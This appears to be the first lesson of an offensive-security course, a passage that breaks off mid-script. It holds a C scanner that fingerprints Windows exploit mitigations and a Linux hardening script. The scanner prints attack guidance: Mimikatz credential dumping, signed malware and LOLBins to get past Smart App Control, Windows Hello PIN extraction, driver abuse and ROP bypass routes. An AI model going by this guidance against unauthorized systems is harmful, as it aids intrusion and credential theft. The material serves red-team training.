## Day 1: Offensive Reconnaissance & Mitigation Fingerprinting

- **Goal**: Master target enumeration - fingerprint system and process mitigations to identify attack vectors.
- **Activities**:
  - _Reading_:
    - [Windows Exploit Protection](https://learn.microsoft.com/en-us/microsoft-365/security/defender-endpoint/exploit-protection-reference) - Official mitigation documentation
    - [Process Mitigation Policies](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-getprocessmitigationpolicy)
    - [Override Process Mitigations via Policy](https://learn.microsoft.com/en-us/windows/security/operating-system-security/device-management/override-mitigation-options-for-app-related-security-policies)
  - _Online Resources_:
    - [DEFCON 27 - Exploiting Windows Exploit Mitigation for ROP Exploits](https://www.youtube.com/watch?v=gIJOtP1AC3A)
    - [Sandbox Mitigations](https://troopers.de/media/filer_public/f6/07/f6076037-85e0-42b7-9a51-507986edafce/the_joy_of_sandbox_mitigations_export.pdf)
    - [Offensive Windows Internals](https://github.com/matthieu-hackwitharts/Win32_Offensive_Cheatsheet)
  - _Tool Setup_:
    - Process Hacker / System Informer
    - WinDbg Preview with mitigation inspection scripts
    - PE-bear / pestudio for binary analysis
  - _Exercise_:
    - Build comprehensive mitigation scanner
    - Enumerate all protected processes on target
    - Identify legacy/unprotected binaries for exploitation

### Deliverables

- [ ] Build a comprehensive mitigation scanner
- [ ] Fingerprint process-level protections remotely
- [ ] Identify unprotected/legacy binaries on target
- [ ] Map kernel mitigation status

### Target Mitigation Landscape

```text
┌─────────────────────────────────────────────────────────────────┐
│              Offensive Reconnaissance: What to Enumerate        │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  SYSTEM-LEVEL                    PROCESS-LEVEL                  │
│  ─────────────                   ─────────────                  │
│  ┌──────────────┐               ┌──────────────┐                │
│  │ VBS/HVCI     │               │ DEP/NX       │                │
│  │ WDAC/CI      │               │ ASLR         │                │
│  │ Secure Boot  │               │ CFG/XFG      │                │
│  │ Credential   │               │ CET/Shadow   │                │
│  │   Guard      │               │ ACG          │                │
│  │ KDP          │               │ CIG          │                │
│  │ KASLR        │               │ Child Process│                │
│  └──────────────┘               └──────────────┘                │
│         │                              │                        │
│         ▼                              ▼                        │
│  Determines:                    Determines:                     │
│  - Kernel exploit              - Shellcode execution            │
│    feasibility                 - Code injection                 │
│  - Driver loading              - ROP requirements               │
│  - Credential theft            - Process hollowing              │
│                                                                 │
│  ATTACK SURFACE MAPPING                                         │
│  ─────────────────────                                          │
│  ├── Unprotected legacy binaries (no ASLR/DEP)                  │
│  ├── Signed but vulnerable drivers (BYOVD)                      │
│  ├── Processes running without ACG/CFG                          │
│  └── Kernel version -> known vulnerabilities                    │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### Mitigation Scanner

This scanner enumerates security boundaries on a Windows target. **Why this matters**: Before exploiting a target, you need to know which mitigations are active.

```c
// unified_recon.c
// Combines system, process, binary, and policy analysis
// Compile: cl src\unified_recon.c /Fe:bin\unified_recon.exe advapi32.lib

#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>

// PE DLL Characteristics flags
#define IMAGE_DLLCHARACTERISTICS_HIGH_ENTROPY_VA    0x0020
#define IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE       0x0040
#define IMAGE_DLLCHARACTERISTICS_NX_COMPAT          0x0100
#define IMAGE_DLLCHARACTERISTICS_NO_SEH             0x0400
#define IMAGE_DLLCHARACTERISTICS_GUARD_CF           0x4000

void CheckSystemMitigations() {
    printf("\n=== SYSTEM-LEVEL MITIGATIONS ===\n\n");

    // Check VBS/HVCI via registry (more reliable than WMI)
    printf("[*] Checking VBS/HVCI status...\n");
    HKEY hKey;
    DWORD vbsEnabled = 0, hvciEnabled = 0;
    DWORD size = sizeof(DWORD);

    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
        "SYSTEM\\CurrentControlSet\\Control\\DeviceGuard", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        RegQueryValueExA(hKey, "EnableVirtualizationBasedSecurity", NULL, NULL, (LPBYTE)&vbsEnabled, &size);
        RegCloseKey(hKey);
    }

    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
        "SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\\Scenarios\\HypervisorEnforcedCodeIntegrity",
        0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        RegQueryValueExA(hKey, "Enabled", NULL, NULL, (LPBYTE)&hvciEnabled, &size);
        RegCloseKey(hKey);
    }

    printf("    VBS: %s\n", vbsEnabled ? "ENABLED" : "Disabled");
    printf("    HVCI: %s\n", hvciEnabled ? "ENABLED" : "Disabled");

    if (hvciEnabled) {
        printf("    [!] HVCI blocks unsigned kernel drivers\n");
        printf("    [*] Attack: Need signed vulnerable driver (BYOVD)\n");
    } else {
        printf("    [+] HVCI disabled - unsigned drivers can load\n");
    }

    // Check Secure Boot via firmware variable
    printf("\n[*] Checking Secure Boot...\n");
    DWORD secureBootEnabled = 0;
    size = sizeof(DWORD);
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
        "SYSTEM\\CurrentControlSet\\Control\\SecureBoot\\State",
        0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        RegQueryValueExA(hKey, "UEFISecureBootEnabled", NULL, NULL, (LPBYTE)&secureBootEnabled, &size);
        RegCloseKey(hKey);
        printf("    Secure Boot: %s\n", secureBootEnabled ? "ENABLED" : "Disabled");
    } else {
        printf("    Secure Boot: Unable to determine (may not be UEFI)\n");
    }

    // Check KASLR status (kernel base randomization)
    printf("\n[*] Checking KASLR (kernel base varies per boot)...\n");
    printf("    Note: KASLR leaks restricted in Win 24H2+ without SeDebugPrivilege\n");
    printf("    KASLR is enabled by default on modern Windows\n");

    // Check Credential Guard
    printf("\n[*] Checking Credential Guard...\n");
    DWORD credGuard = 0;
    size = sizeof(DWORD);
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
        "SYSTEM\\CurrentControlSet\\Control\\Lsa", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        RegQueryValueExA(hKey, "LsaCfgFlags", NULL, NULL, (LPBYTE)&credGuard, &size);
        RegCloseKey(hKey);

        if (credGuard & 1) {
            printf("    Credential Guard: ENABLED\n");
            printf("    [!] Mimikatz credential dumping will FAIL\n");
        } else {
            printf("    Credential Guard: Disabled\n");
            printf("    [+] Mimikatz can dump credentials\n");
        }
    }
}

void CheckProcessMitigations(DWORD pid, const char* procName) {
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
    if (!hProcess) return;

    printf("\n[%s (PID: %d)]\n", procName, pid);

    // DEP
    PROCESS_MITIGATION_DEP_POLICY depPolicy = {0};
    if (GetProcessMitigationPolicy(hProcess, ProcessDEPPolicy, &depPolicy, sizeof(depPolicy))) {
        printf("  DEP: %s%s\n",
            depPolicy.Enable ? "ON" : "OFF",
            depPolicy.Permanent ? " (Permanent)" : "");
    }

    // ASLR
    PROCESS_MITIGATION_ASLR_POLICY aslrPolicy = {0};
    if (GetProcessMitigationPolicy(hProcess, ProcessASLRPolicy, &aslrPolicy, sizeof(aslrPolicy))) {
        printf("  ASLR: BottomUp=%d HighEntropy=%d ForceRelocate=%d\n",
            aslrPolicy.EnableBottomUpRandomization,
            aslrPolicy.EnableHighEntropy,
            aslrPolicy.EnableForceRelocateImages);
    }

    // ACG (Dynamic Code)
    PROCESS_MITIGATION_DYNAMIC_CODE_POLICY acgPolicy = {0};
    if (GetProcessMitigationPolicy(hProcess, ProcessDynamicCodePolicy, &acgPolicy, sizeof(acgPolicy))) {
        printf("  ACG: %s\n", acgPolicy.ProhibitDynamicCode ? "ON (No dynamic code)" : "OFF");
    }

    // CFG
    PROCESS_MITIGATION_CONTROL_FLOW_GUARD_POLICY cfgPolicy = {0};
    if (GetProcessMitigationPolicy(hProcess, ProcessControlFlowGuardPolicy, &cfgPolicy, sizeof(cfgPolicy))) {
        printf("  CFG: %s StrictMode=%d\n",
            cfgPolicy.EnableControlFlowGuard ? "ON" : "OFF",
            cfgPolicy.StrictMode);
    }

    CloseHandle(hProcess);
}

void FindWeakProcesses() {
    printf("\n=== HUNTING WEAK PROCESSES ===\n");
    printf("[*] Looking for processes WITHOUT mitigations (exploitation targets)...\n\n");

    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 pe = { sizeof(pe) };

    if (Process32First(hSnapshot, &pe)) {
        do {
            HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pe.th32ProcessID);
            if (!hProc) continue;

            PROCESS_MITIGATION_DEP_POLICY dep = {0};
            PROCESS_MITIGATION_ASLR_POLICY aslr = {0};
            PROCESS_MITIGATION_CONTROL_FLOW_GUARD_POLICY cfg = {0};

            GetProcessMitigationPolicy(hProc, ProcessDEPPolicy, &dep, sizeof(dep));
            GetProcessMitigationPolicy(hProc, ProcessASLRPolicy, &aslr, sizeof(aslr));
            GetProcessMitigationPolicy(hProc, ProcessControlFlowGuardPolicy, &cfg, sizeof(cfg));

            // Flag if missing critical mitigations
            if (!dep.Enable || !aslr.EnableBottomUpRandomization || !cfg.EnableControlFlowGuard) {
                printf("[!] WEAK: %s (PID %d) - DEP:%d ASLR:%d CFG:%d\n",
                    pe.szExeFile, pe.th32ProcessID,
                    dep.Enable, aslr.EnableBottomUpRandomization, cfg.EnableControlFlowGuard);
            }

            CloseHandle(hProc);
        } while (Process32Next(hSnapshot, &pe));
    }
    CloseHandle(hSnapshot);
}

void EnumerateDrivers() {
    printf("\n=== DRIVER ENUMERATION (BYOVD Targets) ===\n");
    printf("[*] Enumerating loaded kernel drivers...\n\n");

    // Query drivers via registry
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
        "SYSTEM\\CurrentControlSet\\Services", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {

        DWORD index = 0;
        char subKeyName[256];
        DWORD subKeyLen;
        int driverCount = 0;

        printf("%-30s %-10s %s\n", "Driver Name", "Type", "Path");
        printf("%-30s %-10s %s\n", "===========", "====", "====");

        while (1) {
            subKeyLen = sizeof(subKeyName);
            if (RegEnumKeyExA(hKey, index++, subKeyName, &subKeyLen, NULL, NULL, NULL, NULL) != ERROR_SUCCESS)
                break;

            HKEY hSubKey;
            char fullPath[512];
            snprintf(fullPath, sizeof(fullPath), "SYSTEM\\CurrentControlSet\\Services\\%s", subKeyName);

            if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, fullPath, 0, KEY_READ, &hSubKey) == ERROR_SUCCESS) {
                DWORD type = 0;
                DWORD size = sizeof(DWORD);

                if (RegQueryValueExA(hSubKey, "Type", NULL, NULL, (LPBYTE)&type, &size) == ERROR_SUCCESS) {
                    // Type 1 = Kernel driver
                    if (type == 1) {
                        char imagePath[512] = {0};
                        size = sizeof(imagePath);
                        RegQueryValueExA(hSubKey, "ImagePath", NULL, NULL, (LPBYTE)imagePath, &size);

                        printf("%-30s %-10s %s\n", subKeyName, "Kernel", imagePath);
                        driverCount++;

                        if (driverCount >= 20) {  // Limit output
                            printf("\n[*] Showing first 20 drivers. Total may be higher.\n");
                            break;
                        }
                    }
                }
                RegCloseKey(hSubKey);
            }
        }
        RegCloseKey(hKey);
    }

    printf("\n[*] Check against vulnerable driver list:\n");
    printf("    https://www.loldrivers.io/\n");
    printf("    https://github.com/magicsword-io/LOLDrivers\n");
}

// XFG (eXtended Flow Guard) - finer-grained CFI than CFG

void CheckXFGStatus(HANDLE hProcess, const char* procName) {
    /*
    XFG (eXtended Flow Guard) Detection:
    =====================================
    XFG improves on CFG by using type-based hashes for indirect calls.

    Detection methods:
    1. Check PE header for XFG metadata
    2. Look for __guard_xfg_* symbols
    3. Check if process has XFG-aware imports

    Attack implications:
    - XFG makes CFG bypass harder
    - Need type-compatible function for exploit
    - Data-only attacks still work
    */

    PROCESS_MITIGATION_CONTROL_FLOW_GUARD_POLICY cfgPolicy = {0};
    if (GetProcessMitigationPolicy(hProcess, ProcessControlFlowGuardPolicy, &cfgPolicy, sizeof(cfgPolicy))) {
        printf("  XFG Analysis:\n");
        printf("    CFG Enabled: %s\n", cfgPolicy.EnableControlFlowGuard ? "YES" : "NO");
        printf("    Export Suppression: %s\n", cfgPolicy.EnableExportSuppression ? "YES" : "NO");
        printf("    Strict Mode: %s\n", cfgPolicy.StrictMode ? "YES" : "NO");

        if (cfgPolicy.EnableControlFlowGuard && cfgPolicy.StrictMode) {
            printf("    [!] Likely XFG-enabled (strict CFG + export suppression)\n");
            printf("    [*] Attack: Need type-compatible gadgets for bypass\n");
        }
    }
}

void CheckCETShadowStack(HANDLE hProcess, const char* procName) {
    /*
    CET Shadow Stack Detection:
    ===========================
    Hardware-enforced return address protection (Intel 11th gen+)

    Shadow stack keeps copy of return addresses in protected memory.
    ROP attacks fail because RET validates against shadow stack.

    Bypass vectors:
    1. JOP (Jump-Oriented Programming) - doesn't use RET
    2. COP (Call-Oriented Programming)
    3. Find code without CET (legacy binaries)
    4. Disable CET via kernel exploit
    */

    PROCESS_MITIGATION_USER_SHADOW_STACK_POLICY cetPolicy = {0};
    if (GetProcessMitigationPolicy(hProcess, ProcessUserShadowStackPolicy, &cetPolicy, sizeof(cetPolicy))) {
        printf("  CET Shadow Stack:\n");
        printf("    Enabled: %s\n", cetPolicy.EnableUserShadowStack ? "YES" : "NO");
        printf("    Strict Mode: %s\n", cetPolicy.EnableUserShadowStackStrictMode ? "YES" : "NO");
        printf("    Block Non-CET Binaries: %s\n", cetPolicy.BlockNonCetBinaries ? "YES" : "NO");
        printf("    IP Validation: %s\n", cetPolicy.SetContextIpValidation ? "YES" : "NO");

        if (cetPolicy.EnableUserShadowStack) {
            printf("    [!] ROP will FAIL - shadow stack validates returns\n");
            printf("    [*] Attack: Use JOP/COP or find non-CET modules\n");

            if (!cetPolicy.BlockNonCetBinaries) {
                printf("    [+] Non-CET binaries allowed - find legacy DLLs\n");
            }
        } else {
            printf("    [+] CET disabled - ROP attacks viable\n");
        }
    } else {
        printf("  CET Shadow Stack: Not supported or access denied\n");
    }
}

void CheckARM64PAC() {
    /*
    ARM64 Pointer Authentication (PAC):
    ====================================
    Signs pointers with cryptographic signature in unused bits.
    Available on ARM64 Windows 11 and ARM Linux/macOS.

    PAC keys:
    - APIA/APIB: Instruction pointers (return addresses)
    - APDA/APDB: Data pointers
    - APGA: Generic authentication

    Bypass vectors:
    1. PAC oracle to brute-force signature
    2. Pointer substitution attacks
    3. Find code path that doesn't validate
    4. Kernel exploit to leak/forge keys
    */

    printf("\n=== ARM64 PAC Detection ===\n");

    #ifdef _M_ARM64
    // Check if running on ARM64 Windows
    SYSTEM_INFO sysInfo;
    GetNativeSystemInfo(&sysInfo);

    if (sysInfo.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_ARM64) {
        printf("[*] Running on ARM64 architecture\n");

        // Check for PAC support via IsProcessorFeaturePresent
        // PF_ARM_V83_LRCPC_INSTRUCTIONS_AVAILABLE (32) indicates ARMv8.3+
        if (IsProcessorFeaturePresent(32)) {
            printf("[!] ARMv8.3+ detected - PAC likely supported\n");
            printf("[*] Attack implications:\n");
            printf("    - Return addresses are signed (PACIA/PACIB)\n");
            printf("    - ROP gadgets need valid PAC signatures\n");
            printf("    - Look for PAC signing oracles or key leaks\n");
        }
    }
    #else
    printf("[*] Not ARM64 - PAC not applicable\n");
    printf("[*] To test ARM64 PAC: Use Windows on ARM or ARM Linux/macOS\n");
    #endif
}

DWORD GetProcessIdByName(const char* processName) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return 0;

    PROCESSENTRY32 pe = { sizeof(pe) };
    if (Process32First(hSnapshot, &pe)) {
        do {
            if (_stricmp(pe.szExeFile, processName) == 0) {
                DWORD pid = pe.th32ProcessID;
                CloseHandle(hSnapshot);
                return pid;
            }
        } while (Process32Next(hSnapshot, &pe));
    }
    CloseHandle(hSnapshot);
    return 0;
}

void CheckKASANStatus() {
    /*
    Windows KASAN (Kernel Address Sanitizer):
    =========================================
    detects kernel memory bugs.

    Impact on exploitation:
    - UAF and OOB bugs trigger Bug Check 0x1F2
    - Makes reliability testing harder
    - Detects heap spray corruption

    For researchers:
    - Use KASAN to find bugs faster
    - Production systems usually don't have it
    */

    printf("\n=== Windows KASAN Detection ===\n");

    // Check registry for KASAN enablement
    HKEY hKey;
    DWORD kasanEnabled = 0;
    DWORD size = sizeof(DWORD);

    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
        "SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Kernel",
        0, KEY_READ, &hKey) == ERROR_SUCCESS) {

        RegQueryValueExA(hKey, "KasanEnabled", NULL, NULL,
            (LPBYTE)&kasanEnabled, &size);
        RegCloseKey(hKey);
    }

    printf("[*] KASAN Status: %s\n", kasanEnabled ? "ENABLED" : "Disabled/Not configured");

    if (kasanEnabled) {
        printf("[!] KASAN is enabled - memory bugs will trigger BSOD\n");
        printf("[*] This is likely a development/test system\n");
        printf("[*] Exploitation reliability will be harder to achieve\n");
    } else {
        printf("[*] KASAN not enabled - standard exploitation applies\n");
        printf("[*] UAF/OOB exploitation possible without immediate crash\n");
    }
}

void CheckKernelCET() {
    /*
    Kernel-mode CET Shadow Stack:
    =============================
    Protects kernel return addresses from ROP attacks.

    Impact:
    - Kernel ROP chains will fail
    - Need different primitive (JOP, data-only)
    - BYOVD still works if driver doesn't use ROP
    */

    printf("\n=== Kernel CET Shadow Stack ===\n");

    // Query via NtQuerySystemInformation or check feature flags
    // For now, use registry/build check

    OSVERSIONINFOEXW osvi = { sizeof(osvi) };
    typedef NTSTATUS(WINAPI* RtlGetVersion_t)(PRTL_OSVERSIONINFOW);
    RtlGetVersion_t RtlGetVersion = (RtlGetVersion_t)GetProcAddress(
        GetModuleHandleW(L"ntdll.dll"), "RtlGetVersion");
    RtlGetVersion((PRTL_OSVERSIONINFOW)&osvi);

    printf("[*] Build: %d\n", osvi.dwBuildNumber);

    if (osvi.dwBuildNumber >= 22621) {  // Win11 22H2+
        printf("[*] Build supports kernel CET\n");

        // Check via registry for hypervisor settings
        HKEY hKey;
        char cetEnabled[256] = {0};
        DWORD size = sizeof(cetEnabled);

        if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
            "SYSTEM\\CurrentControlSet\\Control\\Session Manager\\kernel",
            0, KEY_READ, &hKey) == ERROR_SUCCESS) {

            if (RegQueryValueExA(hKey, "CetEnabled", NULL, NULL, (LPBYTE)cetEnabled, &size) == ERROR_SUCCESS) {
                printf("[*] Kernel CET Registry: %s\n", cetEnabled);
            }
            RegCloseKey(hKey);
        }

        printf("\n[*] If kernel CET enabled:\n");
        printf("    - Kernel ROP attacks blocked\n");
        printf("    - Need JOP/data-only techniques\n");
        printf("    - Or exploit driver that doesn't use ROP internally\n");
    } else {
        printf("[+] Build predates kernel CET - kernel ROP viable\n");
    }
}

void CheckSmartAppControl() {
    /*
    Smart App Control (SAC):
    ========================
    blocks untrusted applications.

    States:
    - 0: Off (disabled, cannot re-enable without reinstall)
    - 1: On (enforcing, blocks untrusted apps)
    - 2: Evaluation (learning mode)

    Bypass vectors:
    - Signed malware with valid certificates
    - LNK file bypass (CVE-2024-38217)
    - LOLBins (trusted Microsoft binaries)
    - Script execution (PowerShell not blocked by default)
    - DLL sideloading into trusted processes
    */

    printf("\n=== Smart App Control (SAC) ===\n");

    HKEY hKey;
    DWORD sacState = 0;
    DWORD size = sizeof(DWORD);

    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
        "SYSTEM\\CurrentControlSet\\Control\\CI\\Policy",
        0, KEY_READ, &hKey) == ERROR_SUCCESS) {

        if (RegQueryValueExA(hKey, "VerifiedAndReputablePolicyState", NULL, NULL,
            (LPBYTE)&sacState, &size) == ERROR_SUCCESS) {

            switch (sacState) {
                case 0:
                    printf("[+] SAC: Disabled\n");
                    printf("[*] Unsigned executables can run freely\n");
                    break;
                case 1:
                    printf("[!] SAC: ENABLED (Enforcing)\n");
                    printf("[!] Unsigned executables will be blocked\n");
                    printf("[*] Bypass vectors:\n");
                    printf("    - Use signed malware (valid code signing cert)\n");
                    printf("    - LNK file bypass (CVE-2024-38217)\n");
                    printf("    - LOLBins (MSBuild, InstallUtil, Regsvr32)\n");
                    printf("    - Script-based payloads (PowerShell + AMSI bypass)\n");
                    printf("    - DLL sideloading into trusted processes\n");
                    break;
                case 2:
                    printf("[*] SAC: Evaluation Mode (Learning)\n");
                    printf("[*] May transition to enforcing - establish persistence now\n");
                    break;
                default:
                    printf("[?] SAC: Unknown state (%d)\n", sacState);
            }
        } else {
            printf("[*] SAC: Not available (Pre-22H2 or Server)\n");
        }

        RegCloseKey(hKey);
    } else {
        printf("[*] SAC: Not available (Pre-22H2 or Server)\n");
    }
}

void CheckAdminProtection() {
    /*
    Administrator Protection:
    =========================
    Windows Hello for admin operations.

    Impact:
    - UAC bypass alone insufficient
    - Need Windows Hello PIN/biometric credential
    - Kernel-level bypass still works (BYOVD)

    Bypass vectors:
    - Windows Hello PIN extraction (NGC folder + DPAPI)
    - Pre-authentication persistence (standard user)
    - Kernel-level token manipulation (BYOVD)
    - Physical access (offline registry modification)
    - Social engineering (fake Windows Hello prompt)
    */

    printf("\n=== Administrator Protection ===\n");

    HKEY hKey;
    DWORD adminProtection = 0;
    DWORD size = sizeof(DWORD);

    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
        "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",
        0, KEY_READ, &hKey) == ERROR_SUCCESS) {

        RegQueryValueExA(hKey, "EnableAdminProtection", NULL, NULL,
            (LPBYTE)&adminProtection, &size);
        RegCloseKey(hKey);

        if (adminProtection == 1) {
            printf("[!] Administrator Protection: ENABLED\n");
            printf("[!] Admin operations require Windows Hello authentication\n");
            printf("[*] Bypass vectors:\n");
            printf("    - Extract Windows Hello PIN (NGC folder + DPAPI key)\n");
            printf("    - Pre-authentication persistence (standard user context)\n");
            printf("    - Kernel-level bypass (BYOVD -> token manipulation)\n");
            printf("    - Physical access (offline registry modification)\n");
            printf("    - Social engineering (fake Windows Hello prompt)\n");
        } else {
            printf("[+] Administrator Protection: Disabled\n");
            printf("[*] Standard UAC bypass techniques applicable\n");
        }
    } else {
        printf("[*] Administrator Protection: Not available (Pre-24H2)\n");
    }
}

void AnalyzePEFile(const char* filepath) {
    /*
    PE Binary Analysis:
    ===================
    Check PE headers for security mitigations.

    Flags checked:
    - DYNAMIC_BASE: ASLR enabled
    - HIGH_ENTROPY_VA: 64-bit ASLR with more entropy
    - NX_COMPAT: DEP enabled (non-executable stack/heap)
    - GUARD_CF: Control Flow Guard enabled
    - NO_SEH: SEH removed (CFG requirement)
    */

    HANDLE hFile = CreateFileA(filepath, GENERIC_READ, FILE_SHARE_READ,
                               NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("[-] Cannot open: %s\n", filepath);
        return;
    }

    HANDLE hMapping = CreateFileMappingA(hFile, NULL, PAGE_READONLY, 0, 0, NULL);
    if (!hMapping) {
        CloseHandle(hFile);
        return;
    }

    LPVOID pBase = MapViewOfFile(hMapping, FILE_MAP_READ, 0, 0, 0);
    if (!pBase) {
        CloseHandle(hMapping);
        CloseHandle(hFile);
        return;
    }

    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pBase;
    if (pDos->e_magic != IMAGE_DOS_SIGNATURE) {
        UnmapViewOfFile(pBase);
        CloseHandle(hMapping);
        CloseHandle(hFile);
        return;
    }

    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((BYTE*)pBase + pDos->e_lfanew);
    if (pNt->Signature != IMAGE_NT_SIGNATURE) {
        UnmapViewOfFile(pBase);
        CloseHandle(hMapping);
        CloseHandle(hFile);
        return;
    }

    WORD dllChars = pNt->OptionalHeader.DllCharacteristics;

    printf("\n[%s]\n", filepath);
    printf("  ASLR (DYNAMICBASE):    %s\n", (dllChars & IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE) ? "YES" : "NO <<<");
    printf("  High Entropy ASLR:     %s\n", (dllChars & IMAGE_DLLCHARACTERISTICS_HIGH_ENTROPY_VA) ? "YES" : "NO");
    printf("  DEP (NX_COMPAT):       %s\n", (dllChars & IMAGE_DLLCHARACTERISTICS_NX_COMPAT) ? "YES" : "NO <<<");
    printf("  CFG (GUARD_CF):        %s\n", (dllChars & IMAGE_DLLCHARACTERISTICS_GUARD_CF) ? "YES" : "NO <<<");
    printf("  NO_SEH:                %s\n", (dllChars & IMAGE_DLLCHARACTERISTICS_NO_SEH) ? "YES" : "NO");

    // Flag as potential target if missing protections
    if (!(dllChars & IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE) ||
        !(dllChars & IMAGE_DLLCHARACTERISTICS_NX_COMPAT) ||
        !(dllChars & IMAGE_DLLCHARACTERISTICS_GUARD_CF)) {
        printf("  >>> POTENTIAL EXPLOITATION TARGET <<<\n");
    }

    UnmapViewOfFile(pBase);
    CloseHandle(hMapping);
    CloseHandle(hFile);
}

int main(int argc, char* argv[]) {
    CheckSystemMitigations();
    CheckSmartAppControl();
    CheckAdminProtection();
    FindWeakProcesses();
    EnumerateDrivers();
    CheckKernelCET();
    CheckKASANStatus();
    CheckARM64PAC();

    // Check specific high-value target
    DWORD lsassPid = GetProcessIdByName("lsass.exe");
    if (lsassPid) {
        HANDLE hLsass = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, lsassPid);
        if (hLsass) {
            printf("\n[LSASS.EXE Analysis]\n");
            CheckXFGStatus(hLsass, "lsass.exe");
            CheckCETShadowStack(hLsass, "lsass.exe");
            CloseHandle(hLsass);
        }
    }

    // Binary analysis if files provided
    if (argc > 1) {
        printf("\n");

        for (int i = 1; i < argc; i++) {
            AnalyzePEFile(argv[i]);
        }
    }

    printf("\n=== ATTACK PATH RECOMMENDATIONS ===\n");
    printf("1. If VBS/HVCI disabled: Kernel exploitation viable\n");
    printf("2. If weak processes found: Target for injection\n");
    printf("3. If vulnerable drivers present: BYOVD path available\n");
    printf("4. If Credential Guard off: Mimikatz will work\n");
    printf("5. If CET disabled: ROP attacks work\n");
    printf("6. If CET enabled: Use JOP/COP or find non-CET binaries\n");
    printf("7. If XFG strict: Need type-compatible function gadgets\n");
    printf("8. On ARM64 with PAC: Look for signing oracles\n");
    printf("9. If SAC enabled: Use signed malware or LOLBins\n");
    printf("10. If Admin Protection on: Extract Windows Hello PIN or use kernel bypass\n");

    return 0;
}
```

**Usage Examples:**

```bash
# System-wide reconnaissance
.\bin\unified_recon.exe

# Include binary analysis
.\bin\unified_recon.exe bin\vuln_capstone_weak.exe bin\vuln_capstone_hard.exe

# Analyze specific binaries
.\bin\unified_recon.exe C:\Windows\System32\notepad.exe C:\Windows\System32\calc.exe
```

### Linux Mitigation Fingerprinting

Linux systems have their own set of security boundaries that differ significantly from Windows. This scanner checks kernel hardening features. **Why this matters**: io_uring is a game-changer for Linux exploitation - it allows file and network operations without triggering seccomp filters, making it a powerful sandbox escape vector.

```bash
#!/bin/bash
# ~/offensive_lab/linux_mitigation_scanner.sh
# Fingerprints kernel hardening, sandboxing, and exploit mitigations

cat << 'BANNER'
          Linux Mitigation Scanner - Offensive Recon
BANNER

echo ""
echo "=== KERNEL HARDENING STATUS ==="
echo ""

# KASLR
echo -n "[*] KASLR: "
if cat /proc/kallsyms 2>/dev/null | head -1 | grep -q "0000000000000000"; then
    echo "ENABLED (symbols zeroed for non-root)"
    echo "    Attack: Need info leak or /dev/mem access"
else
    echo "READABLE or disabled"
    if [ "$(id -u)" = "0" ]; then
        KBASE=$(cat /proc/kallsyms | head -1 | awk '{print $1}')
        echo "    Kernel base: 0x$KBASE"
    fi
fi

# SMEP/SMAP (CPU features)
echo -n "[*] SMEP: "
if grep -q smep /proc/cpuinfo 2>/dev/null; then
    echo "SUPPORTED (blocks user-space code exec from kernel)"
    echo "    Attack: ROP/JOP required, can't jump to userspace shellcode"
else
    echo "NOT SUPPORTED - ret2user viable"
fi

echo -n "[*] SMAP: "
if grep -q smap /proc/cpuinfo 2>/dev/null; then
    echo "SUPPORTED (blocks user-space data access from kernel)"
    echo "    Attack: Need copy_from_user or disable SMAP (popf gadget)"
else
    echo "NOT SUPPORTED - can access userspace data from kernel"
fi

# Kernel lockdown
echo -n "[*] Kernel Lockdown: "
if [ -f /sys/kernel/security/lockdown ]; then
    LOCKDOWN=$(cat /sys/kernel/security/lockdown)
    echo "$LOCKDOWN"
    if [[ "$LOCKDOWN" == *"[integrity]"* ]] || [[ "$LOCKDOWN" == *"[confidentiality]"* ]]; then
        echo "    Attack: /dev/mem, kexec, BPF restricted"
    fi
else
    echo "NOT CONFIGURED"
fi

# KFENCE (production memory safety)
echo -n "[*] KFENCE: "
if [ -d /sys/kernel/debug/kfence ] 2>/dev/null; then
    echo "ENABLED (sampling memory safety)"
    echo "    Impact: Some UAF/OOB bugs will be detected"
else
    echo "Not detected"
fi

echo ""
echo "=== SANDBOX/LSM STATUS ==="
echo ""

# Check active LSMs
echo "[*] Active LSMs:"
if [ -f /sys/kernel/security/lsm ]; then
    cat /sys/kernel/security/lsm
fi

# Landlock (unprivileged sandboxing)
echo ""
echo -n "[*] Landlock LSM: "
if [ -f /sys/kernel/security/landlock/abi_version ]; then
    VERSION=$(cat /sys/kernel/security/landlock/abi_version)
    echo "AVAILABLE (ABI version $VERSION)"
    echo "    Applications can sandbox themselves without root"
    echo "    Check: strace -e landlock_create_ruleset app"
else
    echo "NOT AVAILABLE"
fi

# eBPF LSM
echo -n "[*] eBPF LSM: "
